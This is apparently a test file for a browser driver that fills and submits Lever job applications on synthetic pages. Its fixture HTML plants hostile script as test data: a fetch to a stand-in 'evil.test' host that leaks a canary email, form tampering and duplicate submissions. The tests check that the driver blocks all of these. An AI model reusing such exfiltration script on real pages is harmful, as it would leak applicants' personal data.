import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { LeverDriver } from "../../../../../plugin/scripts/personal-browser/lever-driver";
import { describe, expect, test } from "bun:test";

const id = "11111111-1111-4111-8111-111111111111";
const url = `https://jobs.lever.co/synthetic/${id}`;
const pdf = Buffer.from("%PDF-SYNTHETIC-ONLY");
async function fixture(
  mode:
    | "normal"
    | "tamper"
    | "duplicate"
    | "lost"
    | "security"
    | "unknown"
    | "radio"
    | "attachment"
    | "widget" = "normal",
) {
  const root = await mkdtemp(join(tmpdir(), "lever-synthetic-"));
  const events: string[] = [];
  const sent: { url: string; method: string; headers: Record<string, string> }[] = [];
  const html = `<!doctype html><html><body><h1>Synthetic Associate</h1>
  ${mode === "security" ? '<input type="password" aria-label="Sign in">' : ""}
  <form id="application-form" action="${url}/apply" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="_csrf" value="synthetic-token">
  <label>Full name<input name="name" required></label><label>Email<input name="email" type="email" required></label>
  <div class="application-question"><div class="application-label">Resume *</div><input name="resume" type="file" required></div>
  <label>Graduate track<select name="cards[0][field0]" required><option value="">Choose</option><option value="yes">Yes</option><option value="no">No</option></select></label>
  ${mode === "radio" ? '<fieldset><legend>Student track *</legend><label>Graduate<input type="radio" name="cards[1][field0]" value="grad" required></label><label>Undergraduate<input type="radio" name="cards[1][field0]" value="undergrad" required></label></fieldset>' : ""}
  ${mode === "attachment" ? '<label>Cover letter<input name="cards[1][file0]" type="file" required></label>' : ""}
  ${mode === "widget" ? '<label>Location<input name="location" role="combobox" required></label>' : ""}
  ${mode === "unknown" ? '<label>Unknown required question<input name="unknown" required></label>' : ""}
  <label>Consent<input type="checkbox" name="consent" required></label><button type="submit">Submit application</button></form>
  <script>fetch('https://evil.test/leak?email=PRIVATE_CANARY').catch(()=>{});fetch('${url}/apply',{method:'POST',body:'unapproved'}).catch(()=>{});
  document.querySelector('form').addEventListener('submit',async e=>{e.preventDefault();const form=new FormData(e.target);${mode === "tamper" ? "form.set('email','other@example.test');" : ""}
  const send=()=>fetch('${url}/apply',{method:'POST',headers:{'x-unapproved':'PRIVATE_CANARY'},body:form}); const r=await send();${mode === "duplicate" ? "await send().catch(()=>{});" : ""}
  if(r.ok) document.body.innerHTML=await r.text();});</script></body></html>`;
  const driver = new LeverDriver({
    transport: async (request) => {
      sent.push({ url: request.url, method: request.method, headers: request.headers });
      if (request.method === "GET")
        return new Response(html, { headers: { "content-type": "text/html" } });
      events.push("POST");
      if (mode === "lost") throw new Error("synthetic lost response");
      return new Response(
        "<h1>Application received</h1><p>Synthetic Associate — person@example.test</p>",
        { headers: { "content-type": "text/html" } },
      );
    },
  });
  driver.configure({
    attemptId: "22222222-2222-4222-8222-222222222222",
    manifestHash: "a".repeat(64),
    identity: `lever:global:synthetic:${id}`,
    authorize: async () => {
      events.push("authorize");
    },
    freeze: async (_target, request) => {
      const proof = JSON.parse(request);
      expect(proof.kind).toBe("lever_hosted_multipart");
      expect(proof.bodyBase64.length).toBeGreaterThan(0);
      events.push("freeze");
    },
  });
  await driver.open(url, join(root, "profile"));
  return {
    driver,
    events,
    sent,
    async fill() {
      const snapshot = await driver.snapshot();
      for (const field of snapshot.fields) {
        if (field.name === "name") await driver.fill(field, "Synthetic Applicant");
        if (field.name === "email") await driver.fill(field, "person@example.test");
        if (field.name === "cards[0][field0]") await driver.fill(field, "Yes");
        if (field.name === "cards[1][field0]") await driver.fill(field, "Graduate");
        if (field.name === "consent") await driver.fill(field, true);
        if (field.name === "resume") await driver.upload(field, "/synthetic/resume.pdf", pdf);
        if (field.name === "cards[1][file0]")
          await driver.upload(field, "/synthetic/cover-letter.pdf", pdf);
      }
      return snapshot;
    },
    async close() {
      await driver.close();
      await rm(root, { recursive: true, force: true });
    },
  };
}
describe("Lever native hosted adapter (synthetic routes only)", () => {
  test.each(["radio", "attachment"] as const)("validates an explicit custom %s", async (mode) => {
    const f = await fixture(mode);
    try {
      const snapshot = await f.fill();
      if (mode === "radio")
        expect(snapshot.fields.find((field) => field.name === "cards[1][field0]")?.label).toBe(
          "Student track *",
        );
      await f.driver.submit();
      expect(f.sent.filter((request) => request.method === "POST")).toHaveLength(1);
      expect(f.driver.confirmed()).toBe(false);
    } finally {
      await f.close();
    }
  }, 20000);
  test("honestly refuses unimplemented dynamic widgets before applicant data entry", async () => {
    const f = await fixture("widget");
    try {
      await expect(f.driver.snapshot()).rejects.toThrow("Unsupported Lever");
      expect(f.sent.filter((request) => request.method === "POST")).toHaveLength(0);
    } finally {
      await f.close();
    }
  }, 20000);
  test("observes custom fields, guards final bytes and freezes before one POST", async () => {
    const f = await fixture();
    try {
      const initial = await f.fill();
      expect(initial.fields.find((field) => field.name === "cards[0][field0]")?.required).toBe(
        true,
      );
      expect(f.sent.filter((request) => request.method === "POST")).toHaveLength(0);
      await f.driver.submit();
      expect(f.events.slice(-3)).toEqual(["authorize", "freeze", "POST"]);
      expect(f.sent.filter((request) => request.method === "POST")).toHaveLength(1);
      expect(f.sent.every((request) => new URL(request.url).host === "jobs.lever.co")).toBe(true);
      expect(f.sent.at(-1)?.headers["x-unapproved"]).toBeUndefined();
      expect(f.driver.submissionEvidence()?.requestBodyHash).toMatch(/^[a-f0-9]{64}$/);
      await expect(f.driver.submit()).rejects.toThrow();
    } finally {
      await f.close();
    }
  }, 20000);
  test.each([
    "tamper",
    "unknown",
  ] as const)("holds %s without forwarding applicant bytes", async (mode) => {
    const f = await fixture(mode);
    try {
      await f.fill();
      await expect(f.driver.submit()).rejects.toThrow();
      expect(f.sent.filter((request) => request.method === "POST")).toHaveLength(0);
    } finally {
      await f.close();
    }
  }, 20000);
  test("reports security controls for the existing user handoff", async () => {
    const f = await fixture("security");
    try {
      expect((await f.driver.snapshot()).securityBlock).toBe(true);
    } finally {
      await f.close();
    }
  }, 20000);
  test.each(["duplicate", "lost"] as const)("never forwards twice after %s", async (mode) => {
    const f = await fixture(mode);
    try {
      await f.fill();
      await f.driver.submit().catch(() => undefined);
      await expect(f.driver.submit()).rejects.toThrow();
      expect(f.sent.filter((request) => request.method === "POST")).toHaveLength(1);
    } finally {
      await f.close();
    }
  }, 20000);
});
